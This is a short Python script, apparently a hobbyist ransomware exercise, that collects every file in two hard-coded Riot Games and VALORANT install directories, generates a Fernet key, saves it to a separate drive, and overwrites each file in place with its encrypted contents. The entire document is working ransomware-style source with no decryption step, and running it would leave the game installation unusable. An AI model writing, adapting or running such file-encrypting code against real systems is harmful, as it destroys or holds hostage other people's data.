import os
from cryptography.fernet import Fernet
# we will make arrays to conatin files. I made 2 arrays because i want to encrypt files from 2 directories
files =[]
files2 = []
#os.chdir changes the current working directory
os.chdir('E:\VALO\Riot Games\Riot Client')
# for loop to add files in array
for file in os.listdir():
    if file == "main.py" or file =="thekey.key" or file == "main2.py": # these files are excluded from encryption
        continue
    if os.path.isfile(file):# only files would be encrypted (no directory would be encrypted)
        files.append(file)
print(files)
os.chdir('E:\VALO\Riot Games\VALORANT\live')
for file in os.listdir():
    if os.path.isfile(file):
        files2.append(file)
print(files2)
os.chdir('H:\EH')
# using fernet library we generate a decryption key
key = Fernet.generate_key()
with open("thekey.key","wb") as thekey:
    thekey.write(key)
# encrypting files
os.chdir('E:\VALO\Riot Games\Riot Client')
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open (file, "wb") as thefile:
            thefile.write(contents_encrypted)
os.chdir('E:\VALO\Riot Games\VALORANT\live')
for file in files2:
    with open(file, "rb") as thefile:
        contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open (file, "wb") as thefile:
            thefile.write(contents_encrypted)

